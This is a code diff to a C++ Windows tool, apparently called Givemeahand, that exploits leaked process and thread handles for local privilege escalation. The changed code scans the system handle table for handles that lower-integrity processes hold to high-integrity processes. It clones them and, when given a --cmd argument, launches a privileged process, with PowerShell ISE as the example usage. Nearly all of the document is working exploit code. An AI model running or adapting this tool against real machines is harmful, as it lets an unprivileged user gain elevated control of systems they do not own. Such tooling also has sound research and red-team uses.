@@ -11,6 +11,7 @@
 
 #include "support.h"
 #include "utils.h"
+#include "Givemeahand.h"
 
 using fNtQuerySystemInformation = NTSTATUS(WINAPI*)(
 	ULONG SystemInformationClass,
@@ -45,8 +46,17 @@ void PrintUsage()
 		"\thttp://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/\n"
 		"\n"
 		"Example usage:\n"
-		"\t.\\Givemeahand --threads (work in progress)\n"
-		"\t.\\Givemeahand --procs --cmd \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\PowerShell_ISE.exe\"\n";
+		"\t.\\Givemeahand --cmd \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\PowerShell_ISE.exe\"\n";
+}
+
+void printHandleInfo(SYSTEM_HANDLE_TABLE_ENTRY_INFO& handle, const DWORD& integrityLevel)
+{
+	std::wcout << "[*] Process: " << GetProcName(handle.UniqueProcessId) << " (" << std::dec << handle.UniqueProcessId << ")" << "\n\t"
+		<< "|_ Handle value: 0x" << std::hex << static_cast<uint64_t>(handle.HandleValue) << "\n\t"
+		<< "|_ Object address: 0x" << std::hex << reinterpret_cast<uint64_t>(handle.Object) << "\n\t"
+		<< "|_ Object type: 0x" << std::hex << static_cast<uint32_t>(handle.ObjectTypeNumber) << "\n\t"
+		<< "|_ Access granted: 0x" << std::hex << static_cast<uint32_t>(handle.GrantedAccess) << "\n\t"
+		<< "|_ Integrity level: 0x" << std::hex << static_cast<uint32_t>(integrityLevel) << std::endl;
 }
 
 int wmain(int argc, wchar_t* argv[], wchar_t* envp[])
@@ -56,16 +66,6 @@ int wmain(int argc, wchar_t* argv[], wchar_t* envp[])
 	if (args.count(L"-h") || args.count(L"--help")) {
 		PrintUsage();
 		return 0;
-	}
-
-	if (args.count(L"--procs") && args.count(L"--threads")) {
-		cerr << "[-] You can only list/exploit one handle type at a time" << endl;
-		return 1;
-	}
-
-	if (!args.count(L"--procs") && args.count(L"--cmd")) {
-		cerr << "[-] --cmd requires --procs" << endl;
-		return 1;
 	}
 
 	NTSTATUS queryInfoStatus = 0;
@@ -84,54 +84,17 @@ int wmain(int argc, wchar_t* argv[], wchar_t* envp[])
 	threadEntry.dwSize = sizeof(THREADENTRY32);
 	vector<DWORD> pids = {};
 
-	if (args.count(L"--procs"))
-	{
-		// start enumerating from the first process
-		auto status = Process32FirstW(snapshot.get(), &processEntry);
-		// start iterating through the PID space and try to open existing processes and map their PIDs to the returned shHandle
-		std::cout << "[*] Creating PIDs/TIDs->Handle map ...\n";
-		do
-		{
-			pids.push_back(processEntry.th32ProcessID);
-			auto hTempHandle = OpenProcess(MAXIMUM_ALLOWED, FALSE, processEntry.th32ProcessID);
-			if (hTempHandle != NULL)
-			{
-				// if we manage to open a shHandle to the process, insert it into the HANDLE - PID map at its PIDth index
-				mHandleId.insert({ hTempHandle, processEntry.th32ProcessID });
-			}
-			else {
-				if (args.count(L"--debug"))
-					cerr << "[.] Failed to open process "
-					<< processEntry.th32ProcessID
-					<< " (" << GetLastError() << ")\n";
-			}
-		} while (Process32NextW(snapshot.get(), &processEntry));
-	}
+	std::cout << "[*] Populating tid2pid map ..." << endl;
+	map<DWORD, DWORD> tid2pid = {};
 
-	if (args.count(L"--threads"))
+	auto status = Thread32First(snapshot.get(), &threadEntry);
+	do
 	{
-		// start enumerating from the first thread
-		// TODO: Implement thread handle exploitation
-		auto status = Thread32First(snapshot.get(), &threadEntry);
-		do
-		{
-			auto hTempHandle = OpenThread(THREAD_QUERY_LIMITED_INFORMATION, FALSE, threadEntry.th32ThreadID);
-			if (hTempHandle != NULL)
-			{
-				// if we manage to open a shHandle to the process, insert it into the HANDLE - PID map at its PIDth index
-				mHandleId.insert({ hTempHandle, threadEntry.th32OwnerProcessID });
-			}
-			else {
-				if (args.count(L"--debug"))
-					cerr << "[.] Failed to open thread " <<
-					threadEntry.th32OwnerProcessID
-					<< " (" << threadEntry.th32ThreadID << ") "
-					<< " [" << GetLastError() << "]\n";
-			}
-		} while (Thread32Next(snapshot.get(), &threadEntry));
-	}
+		tid2pid[threadEntry.th32ThreadID] = threadEntry.th32OwnerProcessID;
+	} while (Thread32Next(snapshot.get(), &threadEntry));
 
-	std::cout << "[*] Populating handleInfo ...\n";
+
+	std::cout << "[*] Populating handleInfo ..." << endl;
 
 	while (queryInfoStatus = NtQuerySystemInformation(
 		(SYSTEM_INFORMATION_CLASS)SystemHandleInformation, //0x10
@@ -145,125 +108,108 @@ int wmain(int argc, wchar_t* argv[], wchar_t* envp[])
 		else handleInfo = tempHandleInfo;
 	}
 
-	std::cout << "[*] Filtering handles ...\n";
+	std::cout << "[*] Looking for vulnerable handles ...\n";
 	std::map<uint64_t, HANDLE> mAddressHandle;
-	DWORD pid = GetCurrentProcessId();
+	std::vector<SYSTEM_HANDLE_TABLE_ENTRY_INFO> vSysHandle;
+
 	for (uint32_t i = 0; i < handleInfo->HandleCount; i++)
 	{
 		auto handle = handleInfo->Handles[i];
-		// skip handles not belonging to this process
-		if (handle.UniqueProcessId != pid)
-			continue;
-		else
+		switch (handle.ObjectTypeNumber)
 		{
-			// switch on the type of object the handle refers to
-			switch (handle.ObjectTypeNumber)
-			{
-			case OB_TYPE_INDEX_PROCESS:
-			{
-				mAddressHandle.insert({ (uint64_t)handle.Object, (HANDLE)handle.HandleValue }); // fill the ADDRESS - HANDLE map 
-				break;
-			}
-			case OB_TYPE_INDEX_THREAD:
-			{
-				mAddressHandle.insert({ (uint64_t)handle.Object, (HANDLE)handle.HandleValue }); // fill the ADDRESS - HANDLE map
-				break;
-			}
-
-			default:
-				continue;
-			}
-		}
-	}
-	if (mAddressHandle.size() == 0)
-	{
-		std::cerr << "[-] No process handle matched the required criteria\n";
-		return 1;
-	}
-
-	std::cout << "[*] Looking for vulnerable handles ...\n";
-	std::vector<SYSTEM_HANDLE_TABLE_ENTRY_INFO> vSysHandle;
-	for (uint32_t i = 0; i < handleInfo->HandleCount; i++) {
-		auto handle = handleInfo->Handles[i];
-		DWORD currentPid = handle.UniqueProcessId;
-		if (currentPid == pid) continue; // skip our process' handles
-		DWORD integrityLevel = GetTargetIntegrityLevel(currentPid);
-
-		if (
-			integrityLevel != 0 &&
-			integrityLevel < SECURITY_MANDATORY_HIGH_RID // the integrity level of the process must be < High
-			)
+		case OB_TYPE_INDEX_PROCESS:
 		{
-			if (((handle.ObjectTypeNumber != OB_TYPE_INDEX_PROCESS) && args.count(L"--procs")) ||
-				((handle.ObjectTypeNumber != OB_TYPE_INDEX_THREAD) && args.count(L"--threads"))) continue;
-
-			if (handle.ObjectTypeNumber == OB_TYPE_INDEX_PROCESS) {
-				if (!(handle.GrantedAccess == PROCESS_ALL_ACCESS ||
-					handle.GrantedAccess & PROCESS_CREATE_PROCESS ||
-					handle.GrantedAccess & PROCESS_CREATE_THREAD ||
-					handle.GrantedAccess & PROCESS_DUP_HANDLE ||
-					handle.GrantedAccess & PROCESS_VM_WRITE)) continue;
-			}
-
-			if (handle.ObjectTypeNumber == OB_TYPE_INDEX_THREAD) {
-				if (!(handle.GrantedAccess == THREAD_ALL_ACCESS ||
-					handle.GrantedAccess & THREAD_DIRECT_IMPERSONATION ||
-					handle.GrantedAccess & THREAD_SET_CONTEXT)) continue;
-			}
-
-			auto address = (uint64_t)(handle.Object);
-			auto foundHandlePair = mAddressHandle.find(address);
-			DWORD handleIntegrityLevel;
-			if (foundHandlePair != mAddressHandle.end()) {
-				auto foundHandle = foundHandlePair->second;
-				auto handlePidPair = mHandleId.find(foundHandle);
-				auto handlePid = handlePidPair->second;
-				handleIntegrityLevel = GetTargetIntegrityLevel(handlePid);
-			}
-			else {
-				if (handle.ObjectTypeNumber == OB_TYPE_INDEX_PROCESS)
-					handleIntegrityLevel = SECURITY_MANDATORY_HIGH_RID;
-				else
-					handleIntegrityLevel = 0;
-			}
-
-			if (
-				handleIntegrityLevel != 0 &&
-				handleIntegrityLevel >= SECURITY_MANDATORY_HIGH_RID // the integrity level of the target must be >= High
-				)
-			{
-				vSysHandle.push_back(handle); // save the interesting handles
-				std::wcout << "[*] Process: " << GetProcName(currentPid) << " (" << std::dec << currentPid << ")" << "\n\t"
-					<< "|_ Handle value: 0x" << std::hex << static_cast<uint64_t>(handle.HandleValue) << "\n\t"
-					<< "|_ Object address: 0x" << std::hex << reinterpret_cast<uint64_t>(handle.Object) << "\n\t"
-					<< "|_ Object type: 0x" << std::hex << static_cast<uint32_t>(handle.ObjectTypeNumber) << "\n\t"
-					<< "|_ Access granted: 0x" << std::hex << static_cast<uint32_t>(handle.GrantedAccess) << "\n\t"
-					<< "|_ Integrity level: 0x" << std::hex << static_cast<uint32_t>(integrityLevel) << std::endl;
-
-				if (args.count(L"--cmd")) {
-					if (handle.ObjectTypeNumber == OB_TYPE_INDEX_PROCESS) {
-						if ((handle.GrantedAccess == PROCESS_ALL_ACCESS ||
-							handle.GrantedAccess & PROCESS_CREATE_PROCESS)) {
-							HANDLE clHandle;
-							if (!CloneHandle(handle.UniqueProcessId, (HANDLE)handle.HandleValue, &clHandle)) {
-								std::cerr << "[-] CloneHandle failed";
-							}
-							DWORD privPid = CreatePrivProc(
-								&clHandle,
-								(WCHAR*)args.find(L"--cmd")->second.c_str());
-							if (privPid == 0) {
-								std::cerr << "[-] CreatePrivProc failed";
-							}
-							else {
-								std::cerr << "[!] Privileged process launched with PID " << privPid << "\n";
-								/*return 0;*/
+			if ((handle.GrantedAccess == PROCESS_ALL_ACCESS ||
+				handle.GrantedAccess & PROCESS_CREATE_PROCESS ||
+				handle.GrantedAccess & PROCESS_CREATE_THREAD ||
+				handle.GrantedAccess & PROCESS_DUP_HANDLE ||
+				handle.GrantedAccess & PROCESS_VM_WRITE)) {
+				HANDLE clHandle;
+				try
+				{
+					if (CloneHandle(handle.UniqueProcessId, (HANDLE)handle.HandleValue, &clHandle)) {
+						DWORD integrityLevel = GetTargetIntegrityLevel(clHandle);
+						// If we could clone the handle but access is denied,
+						// we consider the integrityLevel to be greater than ours ...
+						if (integrityLevel >= SECURITY_MANDATORY_HIGH_RID || GetLastError() == ERROR_ACCESS_DENIED)
+						{
+							vSysHandle.push_back(handle);
+							printHandleInfo(handle, integrityLevel);
+							if (args.count(L"--cmd")) {
+								if (handle.GrantedAccess & PROCESS_CREATE_PROCESS) {
+									HANDLE clHandle;
+									if (!CloneHandle(handle.UniqueProcessId, (HANDLE)handle.HandleValue, &clHandle)) {
+										std::cerr << "[-] CloneHandle failed";
+									}
+									DWORD privPid = CreatePrivProc(
+										&clHandle,
+										(WCHAR*)args.find(L"--cmd")->second.c_str());
+									if (privPid == 0) {
+										std::cerr << "[-] CreatePrivProc failed";
+									}
+									else {
+										std::cerr << "[!] Privileged process launched with PID " << privPid << "\n";
+										return 0;
+									}
+								}
 							}
 						}
 					}
+					CloseHandle(clHandle);
+				}
+				catch (const std::exception&)
+				{
+					continue;
 				}
 			}
+			break;
+		}
+		case OB_TYPE_INDEX_THREAD:
+		{
+			//mAddressHandle.insert({ (uint64_t)handle.Object, (HANDLE)handle.HandleValue }); // fill the ADDRESS - HANDLE map
+			if ((handle.GrantedAccess == THREAD_ALL_ACCESS ||
+				handle.GrantedAccess & THREAD_DIRECT_IMPERSONATION ||
+				handle.GrantedAccess & THREAD_SET_CONTEXT)) {
+				HANDLE clHandle;
+				try
+				{
+					if (CloneHandle(handle.UniqueProcessId, (HANDLE)handle.HandleValue, &clHandle)) {
+						DWORD tid = GetThreadId(clHandle);
+						if (tid == 0)
+						{
+							continue;
+						}
+						auto tid2pidPair = tid2pid.find(tid);
+						if (tid2pidPair == tid2pid.end())
+						{
+							continue;
+						}
+						DWORD pid = tid2pidPair->second;
+						DWORD integrityLevel = GetTargetIntegrityLevel(pid);
+						// If we could clone the handle but access is denied,
+						// we consider the integrityLevel to be greater than ours ...
+						if (integrityLevel >= SECURITY_MANDATORY_HIGH_RID || GetLastError() == ERROR_ACCESS_DENIED)
+						{
+							vSysHandle.push_back(handle);
+							printHandleInfo(handle, integrityLevel);
+						}
+						CloseHandle(clHandle);
+					}
+				}
+				catch (const std::exception&)
+				{
+					continue;
+				}
+			}
+			break;
+		}
+
+		default:
+			continue;
 		}
 	}
-	std::cout << "[" << (vSysHandle.size() > 0 ? "!" : "*") << "] Found " << vSysHandle.size() << " potentially vulnerable handles\n";
+
+	std::cout << "[" << (vSysHandle.size() > 0 ? "!" : "*") << "] Found " << vSysHandle.size() << " vulnerable handles\n";
 	std::cout << "[*] Done\n";
+	return 0;
 }
